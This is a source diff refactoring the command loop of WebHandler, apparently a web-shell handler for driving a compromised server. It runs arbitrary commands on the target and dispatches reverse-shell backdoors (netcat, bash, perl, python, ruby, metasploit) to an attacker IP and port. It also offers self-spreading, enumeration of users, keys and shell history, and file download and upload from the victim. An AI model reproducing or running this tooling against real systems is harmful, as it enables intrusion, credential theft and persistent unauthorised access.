@@ -1,28 +1,44 @@
 from os import getcwd, makedirs, path
-from subprocess import Popen
+from subprocess import Popen, call
 from urllib import unquote
 
+from modules.info import info
+from modules.enumerate import enumerate
+from modules.file_handler import file_handler
+from modules.backdoor import backdoor
+
 from core.libs.menu import banner
-from core.libs.termcolor import colored, cprint
 from core.libs.request_handler import make_request
 from core.libs.environment import complete
 from core.libs.update import update
-from core.modules.backdoor import backdoor
-from core.modules.enumerate import enumerate
-from core.modules.file_handler import file_handler
-from core.modules.info import info
+from core.libs.thirdparty.termcolor import colored, cprint
 
 
 class Commander(object):
     '''
     Class to execute commands on the target
     '''
-    def BackConnect(self):
+    def __init__(self):
+        self.commands = {
+            '@history': self.history,
+            '@info': self.info,
+            '@update': self.update,
+            '@banner': self.banner,
+            '@backdoor': self.backdoor,
+            '@enum': self.enum,
+            '@download': self.download,
+            '@upload': self.upload
+        }
+
+        self.history = []  # Command history
+
+        info.get_information()
         self.cwd = info.cwd
+
+    def BackConnect(self):
         complete.tab()      # calling auto-complete method
-        i = 1
+        cmdcount = 1
         # Empty list to save attacker's pushed commands
-        history = []
         while True:
             try:
                 try:
@@ -33,159 +49,54 @@ class Commander(object):
                             colored('({0})'.format(self.cwd), 'yellow') + ':$ ').strip()
                 # If something went wrong screw the list
                 except IndexError:
-                    command = raw_input('WebHandler@server:$ ')
+                    command = raw_input('WebHandler@server:$ ').strip()
 
-                history.append(unquote(command))
-                if command not in ['exit', 'quit', 'bye']:
+                command_list = command.split()
+
+                # Updating command history
+                self.history.append(unquote(command))
+
+                if command not in ('exit', 'quit', 'bye'):
                     if command == 'clear':
                         Popen('clear', shell=True).wait()
-
-                    # Getting all commands attackr's did on the server
-                    elif command == '@history':
-                        x = 1
-                        for command in history:
-                            print '{0:2d}.) {1}'.format(x, command)
-                            x += 1
-
-                    # Execute the command on the attacker's box if '!' provided at the first of the command
-                    elif command.startswith('!'):
-                        Popen(command[1:], shell=True).wait()
-
-                    # Get stored info from
-                    elif command == '@info':
-                        info.get_information()
-
-                    # Update WebHandler
-                    elif command == '@update':
-                        update()
-
-                    # Get WebHandler banner
-                    elif command == '@banner':
-                        print banner
-
-                    elif command.startswith('@backdoor') or command.startswith('@bd'):
-                        if len(command.split()) == 3:
-                            try:
-                                ip = command.split()[2].split(':')[0]
-                                port = command.split()[2].split(':')[1]
-                            except:
-                                backdoor.list()
-                                ip = None
-                                pass
-                            if ip:
-                                #if command.split()[1] == "bash" or command.split()[1] == "sh":
-                                #    backdoor.bash(ip, port)
-                                #elif command.split()[1] == "java":
-                                #    backdoor.java(ip, port)
-                                if command.split()[1] == "metasploit" or command.split()[1] == "msf":
-                                    backdoor.msf(ip, port)
-                                #elif command.split()[1] == "metasploit-php" or command.split()[1] == "msf-php":
-                                #    backdoor.msf_php(ip, port)
-                                elif command.split()[1] == "netcat" or command.split()[1] == "nc":
-                                    backdoor.netcat(ip, port)
-                                elif command.split()[1] == "bash" or command.split()[1] == "sh":
-                                    backdoor.bash(ip, port)
-                                elif command.split()[1] == "perl" or command.split()[1] == "pl":
-                                    backdoor.perl(ip, port)
-                                #elif command.split()[1] == "php":
-                                #    backdoor.php(ip, port)
-                                elif command.split()[1] == "php-cli":
-                                    backdoor.php_cli(ip, port)
-                                elif command.split()[1] == "python" or command.split()[1] == "py":
-                                    backdoor.python(ip, port)
-                                elif command.split()[1] == "ruby" or command.split()[1] == "rb":
-                                    backdoor.ruby(ip, port)
-                                elif command.split()[1] == "xterm":
-                                    backdoor.xterm(ip, port)
-                                elif command.split()[1] == "testall":
-                                    backdoor.testall(ip, port)
-                                else:
-                                    backdoor.list()
-                        elif len(command.split()) == 2:
-                            if command.split()[1] == "spread" or command.split()[1] == "self":
-                                backdoor.spread()
-                            elif command.split()[1] == "php":
-                                backdoor.php(info.host_ip.split(',')[0], info.local_ip)
-                            else:
-                                backdoor.list()
-                        else:
-                            backdoor.list()
-
-                    elif command.startswith('@enum'):
-                        if len(command.split()) == 2:
-                            if command.split()[1] == "group" or command.split()[1] == "groups":
-                                enumerate.group()
-                            elif command.split()[1] == "history":
-                                enumerate.history()
-                            elif command.split()[1] == "keys":
-                                enumerate.keys()
-                            elif command.split()[1] == "network" or command.split()[1] == "ip":
-                                enumerate.ip()
-                            elif command.split()[1] == "os":
-                                enumerate.os()
-                            elif command.split()[1] == "passwd" or command.split()[1] == "users":
-                                enumerate.passwd()
-                            elif command.split()[1] == "system":
-                                enumerate.system()
-                            elif command.split()[1] == "writable":
-                                enumerate.writable()
-                            else:
-                                enumerate.list()
-                        else:
-                            enumerate.list()
-
-                    elif command.startswith('@download'):
-                        if len(command.split()) != 2 and len(command.split()) != 3:
-                            cprint('\[!] Usage: @download [remote_file_path] <local_file_path>', 'red')
-                        else:
-                            rfile_path = command.split()[1]
-                            if len(command.split()) == 2:
-                                lfile_path = '{0}/output/{1}{2}_{3}'.format(getcwd(), info.host_ip, rfile_path, info.session)
-                                lfolder = '/'.join(lfile_path.split('/')[:-1])
-                                if not path.exists(lfolder):
-                                    makedirs(lfolder)
-                            else:
-                                lfile_path = command.split()[2]
-                            file_handler.download_file(rfile_path, lfile_path)
-
-                    elif command.startswith('@upload'):
-                        if len(command.split()) != 3:
-                            cprint('\n[!] Usage: @upload [local_file_path] [remote_file_path]', 'red')
-                        else:
-                            lfile_path = command.split()[1]
-                            rfile_path = command.split()[2]
-                            file_handler.upload_file(lfile_path, rfile_path)
-
+                    elif command and command[0] == '!':
+                        self.execute(command)
+                    # Execute a module
+                    elif command and command[0] == '@':
+                        try:
+                            self.commands[command_list[0]](command_list)
+                        except KeyError:
+                            cprint('[+] {0}module does not exist!'.format(command_list[0]), 'red')
                     else:
                         try:
                             #Handle the current working directory 'cwd'
-                            if command.split()[0] == 'cd' and len(command.split()) > 1:
+                            if command_list[0] == 'cd' and len(command_list) > 1:
                                 cwd = self.cwd
-                                if '../' in command.split()[-1] or '..' in command.split()[-1]:
+                                if '../' in command_list[-1] or '..' in command_list[-1]:
                                     self.cwd = cwd.rstrip(cwd.split('/').pop()).rstrip('/')
                                 else:
-                                    if command.split()[-1].startswith('/'):
-                                        cmd = '[ -d {0} ] && echo is_valid'.format(command.split()[-1])
+                                    if command_list[-1].startswith('/'):
+                                        cmd = '[ -d {0} ] && echo is_valid'.format(command_list[-1])
                                         if make_request.get_page_source(cmd)[0] == 'is_valid':
-                                            self.cwd = command.split()[-1]
+                                            self.cwd = command_list[-1]
                                         else:
-                                            print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
+                                            print 'bash: cd: {0}: No such file or directory'.format(command_list[-1])
                                     else:
-                                        cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command.split()[-1])
+                                        cmd = '[ -d {0}/{1} ] && echo is_valid'.format(cwd, command_list[-1])
                                         if make_request.get_page_source(cmd)[0] == 'is_valid':
-                                            self.cwd = '{0}/{1}'.format(cwd, command.split()[-1])
+                                            self.cwd = '{0}/{1}'.format(cwd, command_list[-1])
                                         else:
-                                            print 'bash: cd: {0}: No such file or directory'.format(command.split()[-1])
+                                            print 'bash: cd: {0}: No such file or directory'.format(command_list[-1])
 
-                            elif command.split()[0] == 'cd' and len(command.split()) == 1:
+                            elif command_list[0] == 'cd' and len(command) == 1:
                                 self.cwd = info.cwd  # dirty patch to get the original cwd
 
                             else:
                                 # Setting aliases for some commands to avoid
                                 # Issues realted to empty directories
-                                command = command.replace('ls', 'ls -lha') if command.split()[0] == 'ls' else command
-                                command = command.replace('rm', 'rm -v') if command.split()[0] == 'rm' else command
-                                command = command.replace('cp', 'cp -v') if command.split()[0] == 'cp' else command
+                                command = command.replace('ls', 'ls -lha') if command_list[0] == 'ls' else command
+                                command = command.replace('rm', 'rm -v') if command_list[0] == 'rm' else command
+                                command = command.replace('cp', 'cp -v') if command_list[0] == 'cp' else command
                                 command = command.replace('ifconfig', '/sbin/ifconfig')
 
                                 # Get the source code cotenets
@@ -199,22 +110,133 @@ class Commander(object):
                                 else:
                                     errmsg = '{0}: command not found '.format(unquote(command))
                                     errmsg += 'or I don\'t have permission to execute it'
-                                    if command.split()[0] == 'echo':
+                                    if command_list[0] == 'echo':
                                         pass
                                     else:
                                         cprint(errmsg, 'red')
                         except IndexError:
                             pass
-
                 # Exit WebHandler if user provides exit as a command
                 else:
-                    print '\n[+] Preformed "{0}" commands on the server, {1}\n[*] Connection closed'.format(i, info.host_ip.split(',')[0])
+                    print '\n[+] Preformed "%d" commands on the server, %s\n[*] Connection closed' % (cmdcount, info.host_ip.split(',')[0])
                     break
 
             # If recieved a break (^c)... Do nothing!
             except KeyboardInterrupt:
                 print ""
-            i += 1
+            cmdcount += 1
+
+    def execute(self, command):
+        call(command[1:], shell=True)
+
+    def history(self, command):
+        x = 1
+        for command in self.history:
+            print '{0:2d}.) {1}'.format(x, command)
+            x += 1
+
+    def info(self, command):
+        print info.get_information()
+
+    def update(self, command):
+        update()
+
+    def banner(self, command):
+        print banner
+
+    def backdoor(self, command):
+        if len(command) == 3:
+            try:
+                ip = command[2].split(':')[0]
+                port = command[2].split(':')[1]
+            except:
+                backdoor.list()
+                ip = None
+            if ip:
+                #if command[1] == "bash" or command[1] == "sh":
+                #    backdoor.bash(ip, port)
+                #elif command[1] == "java":
+                #    backdoor.java(ip, port)
+                if command[1] in ("metasploit", "msf"):
+                    backdoor.msf(ip, port)
+                #elif command[1] == "metasploit-php" or command[1] == "msf-php":
+                #    backdoor.msf_php(ip, port)
+                elif command[1] in ("netcat", "nc"):
+                    backdoor.netcat(ip, port)
+                elif command[1] in ("bash", "sh"):
+                    backdoor.bash(ip, port)
+                elif command[1] in ("perl", "pl"):
+                    backdoor.perl(ip, port)
+                #elif command[1] == "php":
+                #    backdoor.php(ip, port)
+                elif command[1] == "php-cli":
+                    backdoor.php_cli(ip, port)
+                elif command[1] in ("python", "py"):
+                    backdoor.python(ip, port)
+                elif command[1] in ("ruby", "rb"):
+                    backdoor.ruby(ip, port)
+                elif command[1] == "xterm":
+                    backdoor.xterm(ip, port)
+                elif command[1] == "testall":
+                    backdoor.testall(ip, port)
+                else:
+                    backdoor.list()
+            else:
+                print 'Invalid IP address or port'
+        elif len(command) == 2:
+            if command[1] in ("spread", "self"):
+                backdoor.spread()
+            elif command[1] == "php":
+                backdoor.php(info.host_ip.split(',')[0], info.local_ip)
+            else:
+                backdoor.list()
+        else:
+            backdoor.list()
+
+    def enum(self, command):
+        if len(command) == 2:
+            if command[1] in ("group", "groups"):
+                enumerate.group()
+            elif command[1] == "history":
+                enumerate.history()
+            elif command[1] == "keys":
+                enumerate.keys()
+            elif command[1] in ("network", "ip"):
+                enumerate.ip()
+            elif command[1] == "os":
+                enumerate.os()
+            elif command[1] in ("passwd", "users"):
+                enumerate.passwd()
+            elif command[1] == "system":
+                enumerate.system()
+            elif command[1] == "writable":
+                enumerate.writable()
+            else:
+                enumerate.list()
+        else:
+            enumerate.list()
+
+    def download(self, command):
+        if len(command) not in (2, 3):
+            cprint('\[!] Usage: @download [remote_file_path] <local_file_path>', 'red')
+        else:
+            rfile_path = command[1]
+            if len(command) == 2:
+                lfile_path = '{0}/output/{1}{2}_{3}'.format(getcwd(), info.host_ip, rfile_path, info.session)
+                lfolder = '/'.join(lfile_path.split('/')[:-1])
+                if not path.exists(lfolder):
+                    makedirs(lfolder)
+            else:
+                lfile_path = command[2]
+            file_handler.download_file(rfile_path, lfile_path)
+
+    def upload(self, command):
+        if len(command) != 3:
+            cprint('\n[!] Usage: @upload [local_file_path] [remote_file_path]', 'red')
+        else:
+            lfile_path = command[1]
+            rfile_path = command[2]
+            file_handler.upload_file(lfile_path, rfile_path)
 
 # Taking an instance from the main class
 commander = Commander()
